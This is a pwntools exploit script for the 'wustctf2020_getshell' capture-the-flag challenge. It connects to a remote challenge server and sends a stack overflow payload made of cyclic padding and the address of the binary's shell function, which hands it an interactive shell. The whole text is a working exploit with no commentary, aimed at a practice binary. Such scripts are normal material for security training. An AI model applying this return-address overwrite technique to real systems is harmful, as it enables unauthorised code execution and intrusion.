from pwn import *

context(os = 'linux', arch = 'i386', log_level = 'debug')
# io = process('wustctf2020_getshell')
io = remote('node4.buuoj.cn', 27771)
elf = ELF('wustctf2020_getshell')
shell = elf.symbols['shell']

payload = cyclic(0x1c) + p32(shell)
io.send(payload)
io.interactive()

